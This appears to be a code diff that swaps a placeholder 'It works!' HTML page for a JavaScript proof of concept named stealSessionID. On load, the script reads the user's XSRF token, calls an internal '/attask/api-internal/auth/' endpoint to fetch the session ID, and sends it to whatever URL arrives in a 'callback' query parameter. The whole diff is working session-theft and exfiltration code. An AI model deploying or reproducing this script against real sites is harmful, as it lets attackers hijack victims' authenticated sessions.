@@ -1,5 +1,55 @@
-<!doctype html>
-<html>
-  <head><meta charset="utf-8"><title>Hello</title></head>
-  <body><h1>It works!</h1></body>
-</html>
+function getQueryParam(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
+
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(";").shift();
+}
+
+
+async function stealSessionID() {
+    // Step 1: Get session ID from internal API
+    const response = await fetch('/attask/api-internal/auth/?fields=*&method=put&action=sessionInfo', {
+        method: 'GET',
+        headers: {
+          "X-XSRF-TOKEN": getCookie("XSRF-TOKEN"),
+          "X-Requested-With": "XMLHttpRequest"
+        }
+    });
+
+    const data = await response.json();
+    const sessionID = data.data.result.sessionID;
+
+    // Step 2: Default exfiltration URL
+    let targetUrl = "";
+
+    // Step 3: Check for ?callback= parameter in the current URL
+    const callbackParam = getQueryParam("callback");
+    if (callbackParam) {
+        targetUrl = callbackParam;
+    }
+
+    // Step 4: Send session ID to the chosen endpoint
+    const secondResponse = await fetch(`${targetUrl}?session=${sessionID}`, {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+    });
+
+    const secondData = await secondResponse.json();
+
+    console.log("Second fetch data:", secondData);
+
+    alert(sessionID);
+
+    return {
+        sessionID,
+        secondData
+    };
+}
+
+stealSessionID();
